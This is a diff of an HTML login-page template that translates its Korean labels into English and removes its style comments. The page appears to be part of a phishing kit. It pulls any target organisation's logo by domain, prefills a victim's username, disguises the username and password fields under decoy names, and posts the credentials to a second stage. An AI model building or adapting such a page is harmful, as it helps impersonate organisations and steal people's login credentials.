@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>로그인</title>
+  <title>Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon"/>
   <style>
@@ -13,8 +13,8 @@
       width: 500px;
       height: 500px;
       background-position: center;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Sans-serif font */
-      color: #fff; /* Light text color for better readability */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
     }
 
     .login-container {
@@ -22,16 +22,16 @@
       max-width: 400px;
       margin: auto;
       height: 420px;
-      background: linear-gradient(to right, #FFA07A, #FFD700); /* Gradient orange background */
+      background: linear-gradient(to right, #FFA07A, #FFD700);
       border-radius: 45px;
-      color: #2E8B57; /* Dark green text color */
+      color: #2E8B57;
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
       padding: 70px 30px;
-      animation: shake 0.5s ease-in-out, fadeIn 1s ease-in-out; /* Shaking and fade-in effects */
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); /* Box shadow for depth effect */
+      animation: shake 0.5s ease-in-out, fadeIn 1s ease-in-out;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
     }
 
     @keyframes shake {
@@ -59,8 +59,8 @@
       margin: 0;
       padding: 0;
       font-weight: bold;
-      font-size: 20px; /* Increase font size for headings */
-      color: #333; /* Darker text color */
+      font-size: 20px;
+      color: #333;
     }
 
     .login-container input {
@@ -68,8 +68,8 @@
       margin-bottom: 20px;
       padding: 10px;
       border-radius: 8px;
-      transition: border-bottom 0.3s, transform 0.3s; /* Smooth transition on input */
-      animation: inputPulse 1s infinite alternate; /* Pulsating effect for input fields */
+      transition: border-bottom 0.3s, transform 0.3s;
+      animation: inputPulse 1s infinite alternate;
     }
 
     @keyframes inputPulse {
@@ -85,36 +85,36 @@
     input[type="password"] {
       border: none;
       border-bottom: 1px solid #fff;
-      background: rgba(255, 255, 255, 0.8); /* Slightly transparent white background */
+      background: rgba(255, 255, 255, 0.8);
       outline: none;
       height: 40px;
-      color: #333; /* Darker text color */
+      color: #333;
       font-size: 16px;
     }
 
     .login-container input[type="text"]:focus,
     input[type="password"]:focus {
-      border-bottom: 1px solid #2E8B57; /* Dark green highlight color on focus */
-      transform: scale(1.02); /* Slight scale effect on focus */
+      border-bottom: 1px solid #2E8B57;
+      transform: scale(1.02);
     }
 
     .login-container input[type="submit"] {
       border: none;
       outline: none;
       height: 40px;
-      background: #2E8B57; /* Dark green button background */
-      color: #fff; /* White text color */
+      background: #2E8B57;
+      color: #fff;
       font-size: 18px;
       border-radius: 20px;
-      transition: background 0.3s, color 0.3s; /* Smooth transition on submit button */
+      transition: background 0.3s, color 0.3s;
     }
 
     .login-container input[type="submit"]:hover {
       cursor: pointer;
-      background: #3CB371; /* Lighter green shade for hover */
+      background: #3CB371;
       color: #fff;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2); /* Hover box shadow effect */
-      animation: buttonPulse 0.5s ease-in-out; /* Pulsating effect for the submit button on hover */
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2);
+      animation: buttonPulse 0.5s ease-in-out;
     }
 
     @keyframes buttonPulse {
@@ -133,19 +133,19 @@
       margin: 0;
       padding: 0 0 20px;
       text-align: center;
-      font-size: 24px; /* Increase font size for the main heading */
-      color: #333; /* Darker text color */
+      font-size: 24px;
+      color: #333;
     }
 
     .login-container a {
       text-decoration: none;
       font-size: 14px;
       color: #fff;
-      transition: color 0.3s; /* Smooth transition on anchor tag hover */
+      transition: color 0.3s;
     }
 
     .login-container a:hover {
-      color: #3CB371; /* Lighter green shade for hover */
+      color: #3CB371;
     }
 
     .avatar {
@@ -174,14 +174,14 @@
 <body>
 <div class="login-container">
   <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
-  <h1>여기에서 로그인</h1>
+  <h1>Login Here</h1>
   <form action="second" method="post">
-    <p>사용자 이름</p>
-    <input type="text" name="horse" placeholder="사용자 이름을 입력하세요" value="{{eman}}">
-    <p>비밀번호</p>
-    <input type="password" name="pig" placeholder="비밀번호를 입력하세요" required>
-    <input type="submit" name="submit" value="로그인">
-    <a href="#">비밀번호를 잊었습니까?</a>
+    <p>Username</p>
+    <input type="text" name="horse" placeholder="Enter your username" value="{{eman}}">
+    <p>Password</p>
+    <input type="password" name="pig" placeholder="Enter your password" required>
+    <input type="submit" name="submit" value="Login">
+    <a href="#">Forgot Password?</a>
   </form>
 </div>
 </body>
